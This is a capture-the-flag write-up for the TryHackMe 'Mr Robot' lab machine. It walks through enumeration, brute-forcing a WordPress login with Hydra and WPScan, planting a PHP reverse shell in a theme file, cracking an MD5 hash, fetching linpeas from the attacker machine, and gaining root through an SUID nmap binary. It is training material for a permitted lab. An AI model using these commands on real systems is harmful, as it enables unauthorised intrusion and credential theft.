# Mr Robot CTF writeup
#pentesting/tryhackme

## Scenario
'Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

Credit to Leon Johnson for creating this machine. This machine is used here with the explicit permission of the creator <3'

Let's start !!!!!!!!!!!!!!!!!!!!!!!!!!!!!
## Enumeration
We begin with an nmap scan on the target IP 
```shell
$ nmap -A <target-ip>       
    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-02 10:25 EDT
Nmap scan report for 10.10.151.145
Host is up (0.034s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.32 seconds
```
It appears that SSH is closed and port 80 seems to work, so lets have a browse of the website


![1 web](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/ba9d243a-5ec0-4c48-a83f-01e6815312a4)

On visiting the websites IP, it appears a message from Mr Robot and a list of commands we can run, but nothing spectacular for our needs. At this point, its work checking out the source code of the webpage which can often contain some hidden infomation. 

```js
<!doctype html>
<!--
\   //~~\ |   |    /\  |~~\|~~  |\  | /~~\~~|~~    /\  |  /~~\ |\  ||~~
 \ /|    ||   |   /__\ |__/|--  | \ ||    | |     /__\ | |    || \ ||--
  |  \__/  \_/   /    \|  \|__  |  \| \__/  |    /    \|__\__/ |  \||__
-->
<html class="no-js" lang="">
  <head>
    

    <link rel="stylesheet" href="css/main-600a9791.css">

    <script src="js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js"></script>

    <script>var USER_IP='208.185.115.6';var BASE_URL='index.html';var RETURN_URL='index.html';var REDIRECT=false;window.log=function(){log.history=log.history||[];log.history.push(arguments);if(this.console){console.log(Array.prototype.slice.call(arguments));}};</script>

  </head>
  <body>
    <!--[if lt IE 9]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    

    <!-- Google Plus confirmation -->
    <div id="app"></div>

    
    <script src="js/s_code.js.pagespeed.jm.I78cfHQpbQ.js"></script>
    <script src="js/main-acba06a5.js.pagespeed.jm.YdSb2z1rih.js"></script>
</body>
</html>
```
Nothing special is found here, we dont know the sitemap of the website, so we can now do a dirbuster search of the website for any special or hidden directories that we can discover. We're going to use Gobuster.

```shell
$ gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.151.145
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/02 10:28:51 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.151.145/images/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.151.145/blog/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.151.145/feed/]
/sitemap              (Status: 200) [Size: 0]
/login                (Status: 302) [Size: 0] [--> http://10.10.151.145/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.10.151.145/0/]
/video                (Status: 301) [Size: 235] [--> http://10.10.151.145/video/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.151.145/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.10.151.145/image/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.151.145/feed/atom/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.151.145/wp-content/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.151.145/admin/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.151.145/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2613]
/css                  (Status: 301) [Size: 233] [--> http://10.10.151.145/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.151.145/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.151.145/wp-includes/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.151.145/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.151.145/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.151.145/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.151.145/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.151.145/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.151.145/]
```
After a Gobuster search, i was able to find most important directories within a few minutes and a few got our attention.

This is interesting. On visiting the /robots directory, we found a fsociety.dic and the first flag of the challenge 
![2 robots](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/abc46239-18ff-4b62-a70b-2228afe59068)

lets read the first flag :)

![3 key 1](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/8a358c26-bac9-45df-9fab-9db5fd47e672)

The fsociety.dic contains a wordlist but whats also interesting about the file, after doing further investigation. The content point of the file can be found at the root???

![4 wordlist](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/2b517b47-0b4f-4f53-965d-a557e36bd504)

Lets check the other dirctories :)

License:

![5  lcience](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/1b86edfd-0b8b-414b-8c97-4c979be10545)

we almost skipped past this, but remember to scroll down!!!!!!

![6   pat 2](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/3990387e-5912-4dee-8d55-1aa0eb2db2c0)

Could this be a password ? 

'ZWxsaW90OkVSMjgtMDY1Mgo='

At first we thought it was another flag but its not :( and then we realised, its a Base64 string encoded so we need to decode this string to view its content

```shell
$ echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 --decode          
elliot:ER28-0652
```
This looks like a login information, But to what????

looking back at the Gobuster search, we found a WordPress Login page:

![image](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/a50f1a0c-9ed1-48b9-9883-ad4d7c52f06f)

And We're In !!!!!!!!!!!

![9 were in](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/3cbd6bbe-c8f9-466b-9135-e6b0f59a4de9)

However, there is alternative method to get the login information if the Base64 string didnt exist or missed out, this will involve bruteforcing for the account information.
We notice that upon entering a random username, it'll display an error message! in this case it displays 'invalid username' which is a vulnrability since it gives us the posibility to try out many usernames untill we get the corect one.

![5 admin page](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/f400b41f-ca10-450f-8609-481333cbbb80)

The dictionary file we downloaded can help us in this case as to finding a possible username that can be combined with the previously found password. so lets do abit of bruteforcing!!!! Hydra is going to be used for this 
But first lets get the POST request of the login by using Burpsuite!

Making sure that the proxy is turned on!!

![7 burp part 1](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/908b3961-c546-4d7a-8ad0-7fef7b09bd14)

We opened up Burpsuite and head over to proxy > Intercept to capture the request of the page 

![7 burp part 1](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/fc8a673b-0ab6-4088-9551-6f925e1e4c7f)

We continue to attempt to login and reciving the HTTP-POST request 

![7 burp part 2](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/999151a3-aec1-4453-917c-f7a2d73d832f)

The key element:
```shell
log=admin+&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.151.145%2Fwp-admin%2F&testcookie=1
```
This shows which parameters the web service is expecting upon the POST request 

Hydra Time!!!!!!!!!

```shell
$ hydra -L fsocity.dic -p "testing" 10.10.151.145 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -v
 (username)
```
Running the command and there we go found a username !!!!!!!

Elliot (which makes sense based on the theme of this CTF)

![8 hydra ssh elliot](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/345f1966-7cab-494e-acb5-eb57f9ba69ac)

Now the password! for some reason hydra cant recognise the username inputted so we had to take a different route, using WPscan (which is the same bruteforing technique but for wordpress)

```shell
$ wpscan --url http://10.10.151.145/wp-login.php -U Elliot -P fsocity.dic
```
It took 20-30 mins to show the password, but its the same password as the base64 string so lets just move on :)

## Exploiting WordPress

We now need to get a reverse shell. We went onto Appreance > 404.php and replace the existing code with a php resverse shell code from pentestmonkey. 

https://github.com/pentestmonkey/php-reverse-shell

![10 apperance](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/c5f3695b-f751-454e-901d-dbe7eb9866ea)

Changing the IP (the listener) and the Port number.
```shell
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
Setup a netcat listener to our machine.

```shell
$ nc -lvnp 4444
```

Once completed, we execute the 404.php code in our browser 
```shell
http://<target-IP>/wp-content/themes/twentyfifteen/404.php
```
BOOM! We got a shell :)

```shell
$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.8.122.251] from (UNKNOWN) [10.10.151.145] 32879
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 15:27:12 up  1:02,  0 users,  load average: 1.95, 1.66, 0.96
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```
We now need to stablise our shell, we import the following command

```shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ whoami
whoami
daemon
daemon@linux:/$ 
```
In the Home directory we found the second flag and a password in the robot directory. 
Turns out the flag needs permission to read the file????

```shell
daemon@linux:/$ cd home
cd home
daemon@linux:/home$ ls
ls
robot
daemon@linux:/home$ cd robot
cd robot
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt  password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$
```
Turns out that password belongs to an user called robot

```shell
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015  .
drwxr-xr-x 3 root  root  4096 Nov 13  2015  ..
-r-------- 1 robot robot   33 Nov 13  2015  key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015  password.raw-md5
```
We used a tool called crackstation for cracking hash codes. 

![11 crackstation](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/401acfe9-d215-4ccb-95ea-4f1dd769d1f0)

This might be the password for robot?????

It Is the password lol (nice password).
Lets view the second flag.
```shell
su robot
Password: abcdefghijklmnopqrstuvwxyz
robot@linux:~$ whoami
whoami
robot
robot@linux:~$ cat key-2-of-3.txt
```
## Escalate Privileges 
There are numerous ways to findout what you can escalate your privileges. We used Linpeas.

We create a python HTTP server 

We have to make sure that we change directory to the 'tmp' folder otherwise we cannot import linpeas to the machine as we dont have permissions.

```shell
python -m http.server 80 (our machine)
```
curl command 

```shell
$ wget 10.8.122.251:8000/linpeas.sh
wget 10.8.122.251:8000/linpeas.sh
--2023-08-02 15:50:03--  http://10.8.122.251:8000/linpeas.sh
Connecting to 10.8.122.251:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 134168 (131K) [text/x-sh]
Saving to: ‘linpeas.sh’

100%[======================================>] 134,168      538KB/s   in 0.2s   

2023-08-02 15:50:03 (538 KB/s) - ‘linpeas.sh’ saved [134168/134168]

robot@linux:/tmp$ ls
ls
linpeas.sh
```
Run linpeas and let the magic happen 

```shell
$ sh linpeas.sh
```
After the scan has complete there are some interesting information about the machine

![13 kernal exploit](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/49f79280-2d86-4b9a-b343-71d9d22c42f9)

The machine version is outdated so We could perform a Kernal exploit???

But we're concerned about the random nmap file in the SUID??????

![12 linpeas](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/8046d9c0-082c-4a1b-b90e-a7fe4cd26a07)

This is interesting because if the SUID bit is enabled on a file, this means that non-root users can exploit this and escalate root access!!!

We now read more about this nmap file. behold gtfobins.

https://gtfobins.github.io/

We know the system nmap is running on version 3.x we can perform the following commands.

![15 nmap](https://github.com/Nath28m/CTF-writeups-tryhackme/assets/115990830/1886d687-380d-40aa-8b6a-129e5b6a52ff)

Lets give it a try!!!!

```shell
$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
#
```
Did it work?

```shell
# whoami
whoami
root
```
It did we are now root!!!!!! Let get that final flag 

```shell
# cd root
cd root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
```
EZ!!!
















